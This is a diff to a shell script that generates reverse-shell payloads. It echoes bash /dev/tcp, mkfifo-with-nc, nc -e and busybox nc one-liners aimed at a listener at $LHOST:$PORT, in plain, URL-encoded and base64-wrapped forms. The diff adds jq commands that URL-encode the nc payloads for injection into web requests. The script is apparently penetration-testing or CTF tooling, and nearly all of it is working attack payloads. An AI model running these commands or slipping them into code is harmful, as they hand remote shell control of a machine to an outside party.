@@ -42,7 +42,9 @@ echo "bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$PORT+0>%261'"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $PORT >/tmp/f"
 echo "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20$LHOST%20$PORT%20%3E/tmp/f"
 echo "nc $LHOST $PORT -e /bin/sh"
+jq -rn --arg x "nc $LHOST $PORT -e /bin/sh" '$x|@uri'
 echo "busybox nc $LHOST $PORT -e sh"
+jq -rn --arg x "busybox nc $LHOST $PORT -e sh" '$x|@uri'
 
 ENCODED=$(echo -ne "bash -c 'bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'" | base64 -w0)
 echo "echo $ENCODED | base64 -d | sh"
